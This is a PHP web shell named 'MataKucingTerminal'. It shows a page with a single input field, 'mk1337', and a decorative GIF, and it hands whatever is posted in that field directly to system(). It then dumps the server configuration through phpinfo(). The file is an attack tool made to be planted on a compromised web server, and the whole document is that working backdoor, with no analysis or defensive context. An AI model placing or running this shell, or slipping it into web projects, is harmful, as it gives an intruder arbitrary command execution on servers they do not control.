<?php
 echo '
    <html>
    <head>
    <title>MataKucingTerminal</title>
    <style>
    body {
        background-color: white;
        background-position: fixed;
    }
    </style></head>
    <body><center>
    ';
    echo "<center>";
	echo "<img src='https://c.tenor.com/nhh1RwGnkbQAAAAC/sad-anime.gif'>";
	echo "MataKucingTerminal";
        echo "<pre>";
        echo "<form name='form' action='#' method='post'>
        <input type='text' name='mk1337'/> <input type='submit' value='enter'/>
        </form>";
        $cmd = ($_POST['mk1337']);
        system($cmd);
        echo "</pre>";
        phpinfo();
        die;

phpinfo();
?>